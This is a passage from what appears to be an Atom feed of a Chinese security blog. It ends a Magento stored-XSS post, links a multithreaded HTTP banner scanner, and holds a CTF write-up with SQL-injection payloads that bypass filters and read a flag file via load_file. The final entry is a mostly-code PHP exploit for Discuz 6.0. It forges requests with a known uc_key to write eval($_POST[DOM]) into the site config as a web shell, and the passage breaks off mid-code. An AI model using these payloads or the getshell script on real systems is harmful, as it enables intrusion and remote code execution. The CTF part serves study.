1;">&nbsp; &nbsp;&nbsp;</span></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp; 从代码中可以看出没有明显的xss防御代码</span>&nbsp;&nbsp;<span style="font-family: 微软雅黑; font-size: 11pt; font-weight: bold; line-height: 1;">“&gt;&lt;script&gt;alert(1)&lt;/script&gt;” </span><span style="font-family: 微软雅黑; font-size: 11pt; line-height: 1;">可以通过检测，最后进入数据库。</span><span style="font-size: 14pt; line-height: 1;"><br></span></div><div><span style="font-family: 微软雅黑;">&nbsp; &nbsp;&nbsp;</span><span style="font-family: 微软雅黑; font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;"><font face="微软雅黑">&nbsp; </font>当管理员访问后台订单详情的时候：</span><span style="font-family: 微软雅黑; font-size: 11pt; line-height: 1;"><br></span></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp;&nbsp;</span><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2016/01/wpid-697243fc99e2651154e6088630999881_38d91dd7-60d4-460e-a89f-092e91d34d4f.png" alt=""><span style="font-size: 14pt; line-height: 1;"><br></span></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp; 直接从订单数据库中取出邮箱数据，并没有过滤，形成存储xss漏洞。</span><br></div><!--WizRtf2Html Charset=134  --><div><br></div><div>0x05 修复建议</div></div><div>&nbsp; &nbsp;&nbsp;<span style="font-size: 14pt; line-height: 1;">&nbsp; &nbsp; 升级到最新版本</span>Magento CE 1.9.2.3 和 Magento EE 1.14.2.3<br></div><div><br></div><div><br></div><div><br></div><div><br></div><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;&lt;div&gt;0x00 Magento简介&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&quot;font-size: 14pt; line-height: 1;&quot;&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size: 14pt; line-height: 1;&quot;&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size: 14pt; line-height: 1;&quot;&gt;Magento （麦进斗） 是一套专业开源的电子商务系统。传说中的全球第一的电子商务系统。Magento设计得非常灵活，具有模块化架构体系和丰富的功能。&lt;/span&gt;&lt;span style=&quot;font-size: 14pt; line-height: 1;&quot;&gt;易于与第三方应用系统无缝集成。其面向企业级应用，可处理各方面的需求，以及建设一个多种用途和适用面的电子商务网站。&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;font-size: 14pt; line-height: 1;&quot;&gt;包括购物、航运、产品评论等等，充分利用开源的特性，提供代码库的开发，非常规范的标准，易于与第三方应用系统无缝集成。&lt;/span&gt;&lt;span style=&quot;font-size: 14pt; line-height: 1;&quot;&gt;一款新的专业开源电子商务平台，采用php进行开发，使用Zend Framwork框架。设计得非常灵活，具有模块化架构体系和丰富的功能。&lt;/span&gt;&lt;span style=&quot;font-size: 14pt; line-height: 1;&quot;&gt;易于与第三方应用系统无缝集成。在设计上，包含相当全面，以模块化架构体系，让应用组合变得相当灵活，功能也相当丰富。&lt;/span&gt;&lt;span style=&quot;font-size: 14pt; line-height: 1;&quot;&gt;为了打开盈利途径，Magento同时具备收费的企业版本，积极谋求合作和第三方整合的工具，比如电子支付平台等。&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>多线程HTTP banner扫描工具</title>
    <link href="https://tycx2ry.github.io/2015/12/24/e5-a4-9a-e7-ba-bf-e7-a8-8bhttp-banner-e6-89-ab-e6-8f-8f-e5-b7-a5-e5-85-b7/"/>
    <id>https://tycx2ry.github.io/2015/12/24/e5-a4-9a-e7-ba-bf-e7-a8-8bhttp-banner-e6-89-ab-e6-8f-8f-e5-b7-a5-e5-85-b7/</id>
    <published>2015-12-24T00:15:33.000Z</published>
    <updated>2018-02-26T06:02:42.738Z</updated>
    
    <content type="html"><![CDATA[<div><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/12/wpid-85ed016a93b2275378eb8bcc69cbb5f1_4b9e6b84-6d21-4e25-a9c2-bca80885625e.png" alt=""><br></div><div><a href="wiz://open_attachment?guid=b27d251b-8fca-49ad-bd5a-5d68d23e6e19" target="_blank" rel="noopener"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/12/wpid-85ed016a93b2275378eb8bcc69cbb5f1_18077130.png" alt=""></a></div><a id="more"></a><br><br><div><a href="http://www.wiz.cn/i/93198460" title="来自为知笔记(Wiz)" target="_blank" rel="noopener">来自为知笔记(Wiz)</a></div><div><br><br>### 附件列表<br><br>*   <a href="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/12/wpid-85ed016a93b2275378eb8bcc69cbb5f1_多线程HBSv1.0.zip" target="_blank" rel="noopener">[多线程]HBSv1.0.zip</a></div><p>&nbsp;</p>]]></content>
    
    <summary type="html">
    
      &lt;div&gt;&lt;img src=&quot;http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/12/wpid-85ed016a93b2275378eb8bcc69cbb5f1_4b9e6b84-6d21-4e25-a9c2-bca80885625e.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;a href=&quot;wiz://open_attachment?guid=b27d251b-8fca-49ad-bd5a-5d68d23e6e19&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;img src=&quot;http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/12/wpid-85ed016a93b2275378eb8bcc69cbb5f1_18077130.png&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/div&gt;
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>stripcslashes反序列和条件竞争“暴力”注入writeup</title>
    <link href="https://tycx2ry.github.io/2015/11/25/stripcslashes-e5-8f-8d-e5-ba-8f-e5-88-97-e5-92-8c-e6-9d-a1-e4-bb-b6-e7-ab-9e-e4-ba-89-e6-9a-b4-e5-8a-9b-e6-b3-a8-e5-85-a5writeup/"/>
    <id>https://tycx2ry.github.io/2015/11/25/stripcslashes-e5-8f-8d-e5-ba-8f-e5-88-97-e5-92-8c-e6-9d-a1-e4-bb-b6-e7-ab-9e-e4-ba-89-e6-9a-b4-e5-8a-9b-e6-b3-a8-e5-85-a5writeup/</id>
    <published>2015-11-25T11:38:53.000Z</published>
    <updated>2018-02-26T05:36:35.272Z</updated>
    
    <content type="html"><![CDATA[<p><span style="font-family: Verdana;">    </span>首先感谢各位大牛捧场，从评论中@ca1n牛首先注入到了version(),但没有找到flag，@<a href="http://zone.wooyun.org/user/loopx9" target="_blank" rel="noopener">loopx9</a>最先搞定flag。经联系各位牛，最后发现解题思路为2种，一种是出题者思路，第二种是@<a href="http://zone.wooyun.org/user/loopx9" target="_blank" rel="noopener">loopx9</a>牛的思路。</p><div>源码如下：<br><code>&amp;lt;?phpinclude &#39;config.php&#39;;foreach(array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $key){foreach($$key as $k =&amp;gt; $v){if(is_array($v)){errorBox(&quot;hello,sangebaimao!&quot;);}else{$k[0] !=&#39;_&#39;?$$k = addslashes($v):$$k = &quot;&quot;;}}}if(!empty($message)){if(preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)){die(&quot;hello,sangebaimao!&quot;);}if(filter($message) !== $message){die(&quot;hello,sangebaimao!&quot;);}$sql=&quot;insert guestbook(</code>message<code>) value(&#39;$message&#39;);&quot;;mysql_query($sql);$sql = &quot;select &amp;#42 from guestbook order by id limit 0,5;&quot;;$result = mysql_query($sql);if($result){while($row = mysql_fetch_array($result)){$id = $row[&#39;id&#39;];$message = $row[&#39;message&#39;];echo &quot;|$id|=&amp;gt;|$message|&amp;lt;br/&amp;gt;&quot;;}}$message = stripcslashes($message);$sql = &quot;delete from guestbook where id=$id or message =&#39;$message&#39;;&quot;;if(!mysql_query($sql)){print(mysql_error());$sql = &quot;delete from guestbook where id=$id&quot;;mysql_query($sql);};}function filter($str){$rstr = &quot;&quot;;for($i=0;$i&amp;lt;strlen($str);$i++){if(ord($str[$i])&amp;gt;31 &amp;amp;&amp;amp; ord($str[$i])&amp;lt;127){$rstr = $rstr.$str[$i];}}$rstr = str_replace(&#39;\&#39;&#39;,&#39;&#39;,$rstr);return $rstr;}?&amp;gt;</code><br>首先我们分析代码，代码整体逻辑就是一个伪留言功能：<br><code>insert留言--&amp;gt;select留言--&amp;gt;delete留言</code><br>在留言的过滤上使用了3道防护：<br><code>第一道**addslashes**转义，第二道：**preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)**关键字匹配，第三道：**function filter($str)**删除不可见字符和单引号。</code><br><strong>0x01 stripcslashes反序列\x27绕过</strong><br>首先我们看下stripcslashes函数功能，手册中写道<strong>“可识别类似 C 语言的 \n，\r，… 八进制以及十六进制的描述”</strong>，我们再翻翻stripcslashes的实现，如图所示：<strong>\x27 =&gt; ‘</strong></div><br><div><a href="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/11/51de8128-64c2-4b3e-89ef-5934c9bce1d7.png" target="_blank" rel="noopener"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/11/51de8128-64c2-4b3e-89ef-5934c9bce1d7-300x180.png" alt="" title="51de8128-64c2-4b3e-89ef-5934c9bce1d7"></a><br><a href="http://static.wooyun.org/upload/image/201511/2015112022412139369.png" title="BE1A09A2-D62B-44ED-B3A9-08E5768553E8.png" target="_blank" rel="noopener"><img src="file:///C:/Users/duyihan-xy/Documents/My%20Knowledge/temp/8ea3dbfe-df7a-4d3e-8ac3-fdcd3a730d7f_128_files/51de8128-64c2-4b3e-89ef-5934c9bce1d7.png" alt="BE1A09A2-D62B-44ED-B3A9-08E5768553E8.png"></a><br>我们首先insert “<strong>test\x27</strong>“进入数据库，再select取出经过stripcslashes反转义\x27 =&gt; ‘,形成完整sql语句为:<br><code>delete from guestbook where id=$id or message =&#39;**test&#39;**&#39;</code><br><br>初步搞定第一道防御和第三道防御，第二道防御关键字过滤，熟悉审计的同学看见这个正则匹配可否似曾相识：<a href="http://www.wooyun.org/bugs/wooyun-2013-018431" target="_blank" rel="noopener">WooYun: PHPCMS补丁绕过真正方法</a><br><strong>/&amp;#42!50000select&amp;#42/</strong>绕过第二道防御。<br>最终exp：<code>test\x27 and updatexml(0,concat(0x3a,(/&amp;#42!50000select&amp;#42/load_file(0x2f746d702f666c6167))),0)%23</code><br><a href="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/11/ddf9eb5b-40b2-47bc-8819-b48c25da3149.png" target="_blank" rel="noopener"><img src="http://k1p4ss-wordpress.stor.sinaapp.com/uploads/2015/11/ddf9eb5b-40b2-47bc-8819-b48c25da3149-300x59.png" alt="" title="ddf9eb5b-40b2-47bc-8819-b48c25da3149"></a><br><strong>0x02 条件竞争“暴力”注入</strong>@<a href="http://zone.wooyun.org/user/loopx9" target="_blank" rel="noopener">loopx9</a><br>此思路贡献者是@<a href="http://zone.wooyun.org/user/loopx9" target="_blank" rel="noopener">loopx9</a>牛，首先感谢@<a href="http://zone.wooyun.org/user/loopx9" target="_blank" rel="noopener">loopx9</a>牛屌炸天的思路，良辰我表示服了。<br>首先我们来捋一捋几个sql语句的执行顺序：<br>insert message -&gt; select id -&gt;delete id or message<br>当多线程跑起来的时候：<br>线程1：insert -&gt; select -&gt; delete<br>线程2:  insert -&gt; select -&gt; delete<br><strong>当线程1该执行delete的时候，线程2已经执行了insert，此时数据库中新插入数据为2条。在这两条数据的message字段一样的情况下，线程1继续执行delete的时候就会删除2条数据，此时线程2再执行select语句和delete语句，这样原本数据库中最后一条数据就会被删除。</strong><br>利用这样一个条件竞争漏洞删除数据库中所有数据。<br>当数据库中所有数据被删除，同样的条件竞争下：<br><code>$sql = &quot;select &amp;#42 from guestbook order by id limit 0,5;&quot;;$result = mysql_query($sql);if($result){while($row = mysql_fetch_array($result)){$id = $row[&#39;id&#39;];$message = $row[&#39;message&#39;];echo &quot;|$id|=&amp;gt;|$message|&amp;lt;br/&amp;gt;&quot;;}}</code><br>代码中select不出数据导致$id变量不能被赋值，$id变量就变成了未初始化变量。<br>接下来执行<strong>$sql = “delete from guestbook where id=$id or message =’$message’;”;</strong>的时候，$id未初始化变量被攻击者自定义值，进入sql语句导致注入漏洞形成。<br>最终exp：<strong>?message=1&amp;id=1 and 1=updatexml(0,concat(0x3a,(load_file(0x2f746d702f666c6167))),0)%23</strong><br>放入burp，说句咒语“比卡丘去吧”，只需等待flag。<br>最后感谢@<a href="http://zone.wooyun.org/user/loopx9" target="_blank" rel="noopener">loopx9</a>@牛肉包子 @<a href="http://zone.wooyun.org/user/%E7%8E%89%E6%9E%97%E5%98%8E" target="_blank" rel="noopener">玉林嘎</a> @′  雨。 等各位牛的细心指导。<br><small><small> </small></small></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;span style=&quot;font-family: Verdana;&quot;&gt;    &lt;/span&gt;首先感谢各位大牛捧场，从评论中@ca1n牛首先注入到了version(),但没有找到flag，@&lt;a href=&quot;http://zone.wooyun.org/user/loopx
      
    
    </summary>
    
      <category term="技术文章" scheme="https://tycx2ry.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Dz6.0 uc_key getshell</title>
    <link href="https://tycx2ry.github.io/2015/11/19/dz6-0-uc-key-getshell/"/>
    <id>https://tycx2ry.github.io/2015/11/19/dz6-0-uc-key-getshell/</id>
    <published>2015-11-19T01:51:14.000Z</published>
    <updated>2018-02-26T06:01:52.634Z</updated>
    
    <content type="html"><![CDATA[<div><pre class="prettyprint linenums prettyprinted"><br><br>1.  <font color="#93a1a1">注意事项：dz6.0 uc_key getshell 是因为 xml标签解析函数和加密函数改动变动，改动相应的EXP即可getsehll </font><br>2.  <code>&lt;span class=&quot;pun&quot;&gt;$post = uc_unserialize(uc_post_contents());&lt;/span&gt;</code><br>3.  <code>&lt;span class=&quot;pun&quot;&gt;$configfile = preg_replace(&quot;/define\(&#39;UC_API&#39;,\s&amp;#42&#39;.&amp;#42?&#39;\);/i&quot;, &quot;define(&#39;UC_API&#39;, &#39;$UC_API&#39;);&quot;, $configfile);&lt;/span&gt;</code><br>4.  <code>&lt;span class=&quot;pun&quot;&gt;&lt;/span&gt;</code><br>5.  <code>&lt;span class=&quot;pun&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;php&lt;/span&gt;</code><br>6.  <code>&lt;span class=&quot;com&quot;&gt;// 代码版权归原作者所有！&lt;/span&gt;</code><br>7.  <code>&lt;span class=&quot;pln&quot;&gt;    $timestamp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; time&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()+&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3600&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;</code><br>8.  <code>&lt;span class=&quot;pln&quot;&gt;    $host&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;</code><br>9.  <code>&lt;span class=&quot;pln&quot;&gt;    $uc_key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Qfp1O0N3h5V356bbUdPer3958dp8X3b55dBa9fKai7s3Q7AbY9I3Hcnc7ec505sa&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;</code><br>10.  <code>&lt;span class=&quot;pln&quot;&gt;    $code&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;urlencode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;_authcode&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;time=$timestamp&amp;amp;action=updateapps&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;ENCODE&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $uc_key&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;));&lt;/span&gt;</code><br>11.  <code>&lt;span class=&quot;pln&quot;&gt;    $cmd1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt;</code><br>12.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;</code><br>13.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;UC_API&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;UC_API&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;http://xxx\&#39;);eval($_POST[DOM]);//&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/UC_API&amp;gt;&lt;/span&gt;</code><br>14.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&#39;;&lt;/span&gt;</code><br>15.  <code>&lt;span class=&quot;pln&quot;&gt;    $cmd2=&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;xml version&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;1.0&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; encoding&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;ISO-8859-1&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;?&amp;gt;&lt;/span&gt;</code><br>16.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;</code><br>17.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;item&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;atn&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;atv&quot;&gt;&quot;UC_API&quot;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;http://aaa&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/item&amp;gt;&lt;/span&gt;</code><br>18.  <code>&lt;span class=&quot;tag&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&#39;;&lt;/span&gt;</code><br>19.  <code>&lt;span class=&quot;pln&quot;&gt;    $html1 = send($cmd1);&lt;/span&gt;</code><br>20.  <code>&lt;span class=&quot;pln&quot;&gt;    echo $html1;&lt;/span&gt;</code><br>21.  <code>&lt;span class=&quot;pln&quot;&gt;    #$html2 = send($cmd2);&lt;/span&gt;</code><br>22.  <code>&lt;span class=&quot;pln&quot;&gt;    #echo $html2;&lt;/span&gt;</code><br>23.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>24.  <code>&lt;span class=&quot;pln&quot;&gt;function send($cmd){&lt;/span&gt;</code><br>25.  <code>&lt;span class=&quot;pln&quot;&gt;    global $host,$code;&lt;/span&gt;</code><br>26.  <code>&lt;span class=&quot;pln&quot;&gt;    $message = &quot;POST /dz/api/uc.php?code=&quot;.$code.&quot;  HTTP/1.1\r\n&quot;;&lt;/span&gt;</code><br>27.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Accept: &amp;#42/&amp;#42\r\n&quot;;&lt;/span&gt;</code><br>28.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Referer: &quot;.$host.&quot;\r\n&quot;;&lt;/span&gt;</code><br>29.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Accept-Language: zh-cn\r\n&quot;;&lt;/span&gt;</code><br>30.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;&lt;/span&gt;</code><br>31.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n&quot;;&lt;/span&gt;</code><br>32.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;&lt;/span&gt;</code><br>33.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;;&lt;/span&gt;</code><br>34.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= &quot;Connection: Close\r\n\r\n&quot;;&lt;/span&gt;</code><br>35.  <code>&lt;span class=&quot;pln&quot;&gt;    $message .= $cmd;&lt;/span&gt;</code><br>36.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>37.  <code>&lt;span class=&quot;pln&quot;&gt;    //var_dump($message);&lt;/span&gt;</code><br>38.  <code>&lt;span class=&quot;pln&quot;&gt;    $fp = fsockopen($host, 80);&lt;/span&gt;</code><br>39.  <code>&lt;span class=&quot;pln&quot;&gt;    fputs($fp, $message);&lt;/span&gt;</code><br>40.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>41.  <code>&lt;span class=&quot;pln&quot;&gt;    $resp = &#39;&#39;;&lt;/span&gt;</code><br>42.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>43.  <code>&lt;span class=&quot;pln&quot;&gt;    while ($fp &amp;amp;&amp;amp; !feof($fp))&lt;/span&gt;</code><br>44.  <code>&lt;span class=&quot;pln&quot;&gt;        $resp .= fread($fp, 1024);&lt;/span&gt;</code><br>45.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>46.  <code>&lt;span class=&quot;pln&quot;&gt;    return $resp;&lt;/span&gt;</code><br>47.  <code>&lt;span class=&quot;pln&quot;&gt;}&lt;/span&gt;</code><br>48.  <code>&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;</code><br>49.  <code>&lt;span class=&quot;pln&quot;&gt;function _authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) {&lt;/span&gt;</code><br>50.51.  <code>&lt;span class=&quot;pln&quot;&gt;    $ckey_length = 4;    // 随机密钥长度 取值 0-32;&lt;/span&gt;</code><br>52.  <code>&lt;span class=&quot;pln&quot;&gt;                // 加入随机密钥，可以令密文无任何规律，即便是原文和密钥完全相同，加密结果也会每次不同，增大破解难度。&lt;/span&gt;</code><br>53.  <code>&lt;span class=&quot;pln&quot;&gt;                // 取值越大，密文变动规律越大，密文变化 = 16 的 $ckey_length 次方&lt;/span&gt;</code><br>54.  <code>&lt;span class=&quot;pln&quot;&gt;                // 当此值为 0 时，则不产生随机密钥&lt;/span&gt;</code><br>55.56.  <code>&lt;span class=&quot;pln&quot;&gt;    $key = md5($key ? $key : UC_KEY);&lt;/span&gt;</code><br>57.  <code>&lt;span class=&quot;pln&quot;&gt;    $keya = md5(substr($key, 0, 16));&lt;/span&gt;</code><br>58.  <code>&lt;span class=&quot;pln&quot;&gt;    $keyb = md5(substr($key, 16, 16));&lt;/span&gt;</code><br>59.  <code>&lt;span class=&quot;pln&quot;&gt;    $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;;&lt;/span&gt;</code><br>60.61.  <code>&lt;span class=&quot;pln&quot;&gt;    $cryptkey = $keya.md5($keya.$keyc);&lt;/span&gt;</code><br>62.  <code>&lt;span class=&quot;pln&quot;&gt;    $key_length = strlen($cryptkey);&lt;/span&gt;</code><br>63.64.  <code>&lt;span class=&quot;pln&quot;&gt;    $string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;&lt;/span&gt;</code><br>65.  <code>&lt;span class=&quot;pln&quot;&gt;    $string_length = strlen($string);&lt;/span&gt;</code><br>66.67.  <code>&lt;span class=&quot;pln&quot;&gt;    $result = &#39;&#39;;&lt;/span&gt;</code><br>68.  <code>&lt;span class=&quot;pln&quot;&gt;    $box = range(0, 255);&lt;/span&gt;</code><br>69.70.  <code>&lt;span class=&quot;pln&quot;&gt;    $rndkey = array();&lt;/span&gt;</code><br>71.  <code>&lt;span class=&quot;pln&quot;&gt;    for($i = 0; $i &amp;lt;= 255; $i++) {&lt;/span&gt;</code><br>72.  <code>&lt;span class=&quot;pln&quot;&gt;        $rndkey[$i] = ord($cryptkey[$i % $key_length]);&lt;/span&gt;</code><br>73.  <code>&lt;span class=&quot;pln&quot;&gt;    }&lt;/span&gt;</code><br>74.75.  <code>&lt;span class=&quot;pln&quot;&gt;    for($j = $i = 0; $i &amp;lt; 256; $i++) {&lt;/span&gt;</code><br>76.  <code>&lt;span class=&quot;pln&quot;&gt;        $j = ($j + $box[$i] + $rndkey[$i]) % 256;&lt;/span&gt;</code><br>77.  <code>&lt;span class=&quot;pln&quot;&gt;        $tmp = $box[$i];&lt;/span&gt;</code><br>78.  <code>&lt;span class=&quot;pln&quot;&gt;        $box[$i] = $box[$j];&lt;/span&gt;</code><br>79.  <code>&lt;span class=&quot;pln&quot;&gt;        $box[$j] = $tmp;&lt;/span&gt;</code><br>80.  <code>&lt;span class=&quot;pln&quot;&gt;    }&lt;/span&gt;</code><br>81.82.  <code>&lt;span class=&quot;pln&quot;&gt;    for($a = $j = $i = 0; $i &amp;lt; $string_length; $i++) {&lt;/span&gt;</code><br>83.  <code>&lt;span class=&quot;pln&quot;&gt;        $a = ($a + 1) % 256;&lt;/span&gt;</code><br>84.  <code>&lt;span class=&quot;pln&quot;&gt;        $j = ($j + $box[$a]) % 256;&lt;/span&gt;</code><br>85.  <code>&lt;span class=&quot;pln&quot;&gt;        $tmp = $box[$a];&lt;/span&gt;</code><br>86.  <code>&lt;span class=&quot;pln&quot;&gt;        $box[$a] = $box[$j];&lt;/span&gt;</code><br>87.  <code>&lt;span class=&quot;pln&quot;&gt;        $box[$j] = $tmp;&lt;/span&gt;</code><br>88.  <code>&lt;span class=&quot;pln&quot;&gt;        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));&lt;/span&gt;</code><br>89.  <code>&lt;span class=&quot;pln&quot;&gt;    }&lt;/span&gt;</code><br>90.91.  <code>&lt;span class=&quot;pln&quot;&gt;    if($operation == &#39;DECODE&#39;) {&lt;/span&gt;</code><br>92.  <code>&lt;span class=&quot;pln&quot;&gt;        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &amp;gt; 0) &amp;amp;&amp;amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {&lt;/span&gt;</code><br>93.  <code>&lt;span class=&quot;pln&quot;&gt;            return substr($result, 26);&lt;/span&gt;</code><br>94.  <code>&lt;span class=&quot;pln&quot;&gt;        } else {&lt;/span&gt;</code><br>95.  <code>&lt;span class=&quot;pln&quot;&gt;            return &#39;&#39;;&lt;/span&gt;</code><br>96.  <code>&lt;span class=&quot;pln&quot;&gt;        }&lt;/span&gt;</code><br>97.  <code>&lt;span class=&quot;pln&quot;&gt;    } else {&lt;/span&gt;</code><br>98.  <code>&lt;span class=&quot;pln&quot;&gt;        return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result));&lt;/span&gt;</code><br>99.  <code>&lt;span 